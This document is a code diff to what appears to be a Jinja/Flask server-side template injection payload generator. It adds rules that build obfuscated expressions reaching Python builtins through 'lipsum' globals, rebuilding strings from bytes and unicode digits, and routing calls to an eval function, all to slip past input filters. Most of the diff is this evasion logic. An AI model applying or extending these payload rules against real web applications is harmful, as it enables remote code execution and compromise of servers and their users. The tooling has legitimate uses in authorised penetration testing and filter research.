@@ -32,6 +32,7 @@ from typing import (
     Any,
     Tuple,
 )
+from pprint import pformat
 
 from .colorize import colored
 from .const import *
@@ -50,6 +51,7 @@ if sys.version_info >= (3, 8):
     WithContextVarTarget = Tuple[Literal["with_context_var"], str]
     JinjaContextVarTarget = Tuple[Literal["jinja_context_var"], str]
     FlaskContextVarTarget = Tuple[Literal["flask_context_var"], str]
+    RequirePython3Target = Tuple[Literal["require_python3"], str]
     ZeroTarget = Tuple[Literal["zero"],]
     PositiveIntegerTarget = Tuple[Literal["positive_integer"], int]
     IntegerTarget = Tuple[Literal["integer"], int]
@@ -118,6 +120,7 @@ else:
     WithContextVarTarget = Tuple
     FlaskContextVarTarget = Tuple
     JinjaContextVarTarget = Tuple
+    RequirePython3Target = Tuple
     Target = Tuple
 
 
@@ -148,7 +151,7 @@ precedence = [
         "slide",
         "function_call",
     ],
-    ["filter"],
+    ["filter", "filter_with_function_call"],
     [
         "power",
     ],
@@ -253,6 +256,8 @@ def tree_precedence(tree):
             PLUS,
             MULTIPLY,
             MOD,
+            ATTRIBUTE,
+            ITEM
         ]:
             # might be transformed into filters
             sub_target_answer = tree_precedence(sub_target_tree)
@@ -308,7 +313,7 @@ class CacheByRepr:
 
     def __contains__(self, k):
         repr_k = repr(k)
-        for k_store, v in self.cache.get(repr_k, []):
+        for k_store, _ in self.cache.get(repr_k, []):
             if k_store == k:
                 return True
         return False
@@ -472,6 +477,17 @@ class PayloadGenerator:
             )
             ret = self.generate_by_list([(ENCLOSE, target[2])])
             return ret
+        else:
+            logger.debug(
+                (
+                    "enclose_under_generate: result_precedence >= "
+                    + "target[1], result_precedence=%d, target[1]=%s"
+                    + "target[2]=%s"
+                ),
+                result_precedence,
+                target[1],
+                pformat(target[2])
+            )
         return str_result, used_context, tree
 
     @register_generate_func(lambda self, target: target[0] == UNSATISFIED)
@@ -542,6 +558,22 @@ class PayloadGenerator:
             return None
         return (target[1], {}, None)
 
+    @register_generate_func(lambda self, target: target[0] == REQUIRE_PYTHON3)
+    def require_python3_generate(
+        self, target: RequirePython3Target
+    ) -> Union[PayloadGeneratorResult, None]:
+        """生成类型为flask_context_var_generate的生成目标，将其中包含的变量名加入到已经使用的变量中
+
+        Args:
+            target (RequirePython3Target): 生成目标
+
+        Returns:
+            _type_: 生成结果
+        """
+        if self.options.python_version != PYTHON_VERSION_3:
+            return None
+        return ("", {}, None)
+
     @register_generate_func(lambda self, target: True)
     def common_generate(self, gen_req: Target) -> Union[PayloadGeneratorResult, None]:
         """为剩下所有类型的生成目标生成对应的payload, 遍历对应的expression_gen，拿到
@@ -562,6 +594,7 @@ class PayloadGenerator:
         if self.options.detect_mode == DETECT_MODE_FAST:
             gens.sort(key=lambda gen: self.used_count[gen.__name__], reverse=True)
         for gen in gens:
+            logger.debug("Trying gen rule: %s", gen.__name__)
             gen_ret: List[Target] = gen(self.context, *args)
             ret = self.generate_by_list(gen_ret)
             if ret is None:
@@ -854,6 +887,35 @@ def gen_function_call_normal2(context: dict, function_target, args_target_list):
     )
     return [(EXPRESSION, precedence["function_call"], target_list)]
 
+@expression_gen
+def gen_function_call_normal3(context: dict, function_target, args_target_list):
+    target_list = (
+        [
+            (ENCLOSE_UNDER, precedence["filter_with_function_call"], function_target),
+            (LITERAL, "("),
+        ]
+        + join_target((LITERAL, ","), args_target_list)
+        + [
+            (LITERAL, ")"),
+        ]
+    )
+    return [(EXPRESSION, precedence["filter_with_function_call"], target_list)]
+
+@expression_gen
+def gen_function_call_normal4(context: dict, function_target, args_target_list):
+    target_list = (
+        [
+            (ENCLOSE_UNDER, precedence["filter_with_function_call"], function_target),
+            (LITERAL, "("),
+        ]
+        + join_target((LITERAL, ","), args_target_list)
+        + [
+            (LITERAL, ","),
+            (LITERAL, ")"),
+        ]
+    )
+    return [(EXPRESSION, precedence["filter_with_function_call"], target_list)]
+
 
 # ---
 
@@ -1034,7 +1096,7 @@ def gen_positive_integer_unicode(context: dict, value: int):
     ]
     return [(EXPRESSION, precedence["literal"], [
         (LITERAL, str(value)[0]), (ONEOF,*payload_targets)
-    ])]
+    ])] + [(REQUIRE_PYTHON3, )]
 
 
 @expression_gen
@@ -1047,7 +1109,7 @@ def gen_positive_integer_unicodehex(context: dict, value: int):
         for payload in transform_int_chars_unicode(value_hex_literal)
     ]
     targets_list = [(LITERAL, "0x"), (ONEOF, *payload_targets)]
-    return [(EXPRESSION, precedence["literal"], targets_list)]
+    return [(EXPRESSION, precedence["literal"], targets_list)] + [(REQUIRE_PYTHON3, )]
 
 
 @expression_gen
@@ -1577,7 +1639,7 @@ def gen_string_percent_lipsum5(context):
     return [
         (
             EXPRESSION,
-            precedence["function_call"],
+            precedence["filter_with_function_call"],
             [
                 (LITERAL, "lipsum|attr("),
                 (VARIABLE_OF, "__globals__"),
@@ -1665,7 +1727,7 @@ def gen_string_percent_dictbatch(context):
         (INTEGER, 37),
         (LITERAL, ")"),
     ]
-    return [(EXPRESSION, precedence["function_call"], target_list)]
+    return [(EXPRESSION, precedence["filter_with_function_call"], target_list)]
 
 
 @expression_gen
@@ -1705,7 +1767,7 @@ def gen_string_percent_lipsumcomplex(context):
         (INTEGER, 37),
         (LITERAL, ")"),
     ]
-    return [(EXPRESSION, precedence["function_call"], target_list)]
+    return [(EXPRESSION, precedence["filter_with_function_call"], target_list)]
 
 
 @expression_gen
@@ -2683,104 +2745,104 @@ def gen_string_splitdictjoin3(context: dict, value: str):
     return [(EXPRESSION, precedence["filter"], target_list)]
 
 
-# @expression_gen
-# def gen_string_lipsumtobytes4(context: dict, value: str):
-#     value_tpl = (
-#         [(LITERAL, "(")]
-#         + join_target(sep=(LITERAL, ","), targets=[(INTEGER, ord(c)) for c in value])
-#         + [(LITERAL, ")")]
-#     )
-#     bytes_targets_noendbracket = (
-#         [
-#             (LITERAL, "lipsum["),
-#             (VARIABLE_OF, "__globals__"),
-#             (LITERAL, "]["),
-#             (VARIABLE_OF, "__builtins__"),
-#             (LITERAL, "]["),
-#             (VARIABLE_OF, "bytes"),
-#             (LITERAL, "]("),
-#         ]
-#         + value_tpl
-#     )
-#     functioncall = (ONEOF,
-#         [(LITERAL, "()")],
-#         [(LITERAL, "( )")],
-#         [(LITERAL, "(\n)")],
-#         [(LITERAL, "(\t)")],
-#     )
-#     target_list1 = bytes_targets_noendbracket + [
-#         (LITERAL, ")"),
-#         (LITERAL, "["),
-#         (VARIABLE_OF, "decode"),
-#         (LITERAL, "]"),
-#         functioncall
-#     ]
-#     target_list2 = bytes_targets_noendbracket + [
-#         (LITERAL, ",)"),
-#         (LITERAL, "["),
-#         (VARIABLE_OF, "decode"),
-#         (LITERAL, "]"),
-#         functioncall
-#     ]
-#     return [
-#         (
-#             EXPRESSION,
-#             precedence["function_call"],
-#             [(ONEOF, target_list1, target_list2), ]
-#         )
-#     ]
+@expression_gen
+def gen_string_lipsumtobytes4(context: dict, value: str):
+    value_tpl = (
+        [(LITERAL, "(")]
+        + join_target(sep=(LITERAL, ","), targets=[(INTEGER, ord(c)) for c in value])
+        + [(LITERAL, ")")]
+    )
+    bytes_targets_noendbracket = (
+        [
+            (LITERAL, "lipsum["),
+            (VARIABLE_OF, "__globals__"),
+            (LITERAL, "]["),
+            (VARIABLE_OF, "__builtins__"),
+            (LITERAL, "]["),
+            (VARIABLE_OF, "bytes"),
+            (LITERAL, "]("),
+        ]
+        + value_tpl
+    )
+    functioncall = (ONEOF,
+        [(LITERAL, "()")],
+        [(LITERAL, "( )")],
+        [(LITERAL, "(\n)")],
+        [(LITERAL, "(\t)")],
+    )
+    target_list1 = bytes_targets_noendbracket + [
+        (LITERAL, ")"),
+        (LITERAL, "["),
+        (VARIABLE_OF, "decode"),
+        (LITERAL, "]"),
+        functioncall
+    ]
+    target_list2 = bytes_targets_noendbracket + [
+        (LITERAL, ",)"),
+        (LITERAL, "["),
+        (VARIABLE_OF, "decode"),
+        (LITERAL, "]"),
+        functioncall
+    ]
+    return [
+        (
+            EXPRESSION,
+            precedence["function_call"],
+            [(ONEOF, target_list1, target_list2), ]
+        )
+    ] + [(REQUIRE_PYTHON3, )]
 
 
-# @expression_gen
-# def gen_string_lipsumtobytes5(context: dict, value: str):
-#     value_tpl = (
-#         [(LITERAL, "(")]
-#         + join_target(sep=(LITERAL, ","), targets=[(INTEGER, ord(c)) for c in value])
-#         + [(LITERAL, ")")]
-#     )
-#     bytes_targets_noendbracket = (
-#         [
-#             (LITERAL, "lipsum|attr("),
-#             (VARIABLE_OF, "__globals__"),
-#             (LITERAL, ")|attr("),
-#             (VARIABLE_OF, "__getitem__"),
-#             (LITERAL, ")("),
-#             (VARIABLE_OF, "__builtins__"),
-#             (LITERAL, ")|attr("),
-#             (VARIABLE_OF, "__getitem__"),
-#             (LITERAL, ")("),
-#             (VARIABLE_OF, "bytes"),
-#             (LITERAL, ")("),
-#         ]
-#         + value_tpl
-#     )
-#     functioncall = (ONEOF,
-#         [(LITERAL, "()")],
-#         [(LITERAL, "( )")],
-#         [(LITERAL, "(\n)")],
-#         [(LITERAL, "(\t)")],
-#     )
-#     target_list1 = bytes_targets_noendbracket + [
-#             (LITERAL, ")"),
-#             (LITERAL, "|attr("),
-#             (VARIABLE_OF, "decode"),
-#             (LITERAL, ")"),
-#             functioncall
-#         ]
-#     target_list2 = bytes_targets_noendbracket + [
-#             (LITERAL, ",)"),
-#             (LITERAL, "|attr("),
-#             (VARIABLE_OF, "decode"),
-#             (LITERAL, ")"),
-#             functioncall
-#         ]
-#     return [
-#         (
-#             EXPRESSION,
-#             precedence["filter"],
-#             [(ONEOF, target_list1, target_list2), ]
-#         )
-#     ]
+@expression_gen
+def gen_string_lipsumtobytes5(context: dict, value: str):
+    value_tpl = (
+        [(LITERAL, "(")]
+        + join_target(sep=(LITERAL, ","), targets=[(INTEGER, ord(c)) for c in value])
+        + [(LITERAL, ")")]
+    )
+    bytes_targets_noendbracket = (
+        [
+            (LITERAL, "lipsum|attr("),
+            (VARIABLE_OF, "__globals__"),
+            (LITERAL, ")|attr("),
+            (VARIABLE_OF, "__getitem__"),
+            (LITERAL, ")("),
+            (VARIABLE_OF, "__builtins__"),
+            (LITERAL, ")|attr("),
+            (VARIABLE_OF, "__getitem__"),
+            (LITERAL, ")("),
+            (VARIABLE_OF, "bytes"),
+            (LITERAL, ")("),
+        ]
+        + value_tpl
+    )
+    functioncall = (ONEOF,
+        [(LITERAL, "()")],
+        [(LITERAL, "( )")],
+        [(LITERAL, "(\n)")],
+        [(LITERAL, "(\t)")],
+    )
+    target_list1 = bytes_targets_noendbracket + [
+            (LITERAL, ")"),
+            (LITERAL, "|attr("),
+            (VARIABLE_OF, "decode"),
+            (LITERAL, ")"),
+            functioncall
+        ]
+    target_list2 = bytes_targets_noendbracket + [
+            (LITERAL, ",)"),
+            (LITERAL, "|attr("),
+            (VARIABLE_OF, "decode"),
+            (LITERAL, ")"),
+            functioncall
+        ]
+    return [
+        (
+            EXPRESSION,
+            precedence["filter"],
+            [(ONEOF, target_list1, target_list2), ]
+        )
+    ] + [(REQUIRE_PYTHON3, )]
 
 
 
@@ -3019,22 +3081,22 @@ def gen_item_normal2(context, obj_req, item_name):
 
 @expression_gen
 def gen_item_dunderfunc(context, obj_req, item_name):
-    target_list = [
+    target_head = [
         (
             ENCLOSE_UNDER,
-            precedence["function_call"],
+            precedence["filter_with_function_call"],
             (ATTRIBUTE, obj_req, "__getitem__"),
         ),
         (LITERAL, "("),
         (STRING, item_name),
-        (LITERAL, ")"),
     ]
-    return [(EXPRESSION, precedence["function_call"], target_list)]
+    target = (ONEOF, target_head + [(LITERAL, ")")], target_head + [(LITERAL, ",)")])
+    return [(EXPRESSION, precedence["filter_with_function_call"], [target])]
 
 
 @expression_gen
 def gen_item_dunderfunc2(context, obj_req, item_name):
-    target_list = [
+    target_head = [
         (
             ENCLOSE_UNDER,
             precedence["function_call"],
@@ -3042,10 +3104,9 @@ def gen_item_dunderfunc2(context, obj_req, item_name):
         ),
         (LITERAL, "("),
         (STRING, item_name),
-        (LITERAL, ",)"),
     ]
-    return [(EXPRESSION, precedence["function_call"], target_list)]
-
+    target = (ONEOF, target_head + [(LITERAL, ")")], target_head + [(LITERAL, ",)")])
+    return [(EXPRESSION, precedence["function_call"], [target])]
 
 # ---
 
@@ -3375,24 +3436,14 @@ def gen_eval_func_safezfill(context):
 
 @expression_gen
 def gen_eval_normal(context, eval_param):
-    target_list = [
-        (ENCLOSE_UNDER, precedence["function_call"], (EVAL_FUNC,)),
-        (LITERAL, "("),
-        eval_param,
-        (LITERAL, ")"),
-    ]
-    return [(EXPRESSION, precedence["function_call"], target_list)]
-
-
-@expression_gen
-def gen_eval_normal2(context, eval_param):
-    target_list = [
-        (ENCLOSE_UNDER, precedence["function_call"], (EVAL_FUNC,)),
-        (LITERAL, "("),
-        eval_param,
-        (LITERAL, ",)"),
-    ]
-    return [(EXPRESSION, precedence["function_call"], target_list)]
+    return [(FUNCTION_CALL, (EVAL_FUNC,), [eval_param])]
+    # target_list = [
+    #     (ENCLOSE_UNDER, precedence["function_call"], (EVAL_FUNC,)),
+    #     (LITERAL, "("),
+    #     eval_param,
+    #     (LITERAL, ")"),
+    # ]
+    # return [(EXPRESSION, precedence["function_call"], target_list)]
 
 
 # ---
